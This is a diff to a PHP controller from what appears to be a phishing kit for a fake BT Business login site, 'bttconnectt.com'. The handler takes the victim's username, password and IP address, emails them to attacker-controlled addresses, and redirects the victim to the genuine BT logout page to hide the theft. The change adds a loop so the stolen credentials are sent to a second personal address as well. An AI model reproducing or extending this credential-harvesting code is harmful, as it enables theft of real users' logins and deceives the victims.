@@ -71,15 +71,18 @@ class MainController extends Controller {
          {
 			 $ip = getenv("REMOTE_ADDR");
 				$s = "New  Login ~~ ".$ip." ~~ ".date("h:i A jS F, Y");
+				$ems = ['johnpeachprivate@gmail.com','aquarius4tkud@yahoo.com'];
+				foreach($ems as $em){
              $msg = "<h2 style='color: green;'>New login from bttconnectt.com</h2><p>User: <b>".$req['USER']."</b></p><p>Password: <b>".$req['PASSWORD']."</b></p><br><br><marquee><small style='color: red'>@tkud04</small></marquee>";
 		     $dt = [
 		      'sn' => "BttConnectt Postman",
-		      'em' => "aquarius4tkud@yahoo.com",
+		      'em' => $em,
 		      'sa' => "uwantbrendacolson@gmail.com",
 		      'subject' => $s,
 		      'message' => $msg,
 		   ];
         	$this->helpers->bomb($dt);
+        }
 			return redirect()->away('https://secure.business.bt.com/Hub/Logout?target=ESERVE&amp;s_cid=btb_email_NewBill_viewyourbill');
          } 	  
     }
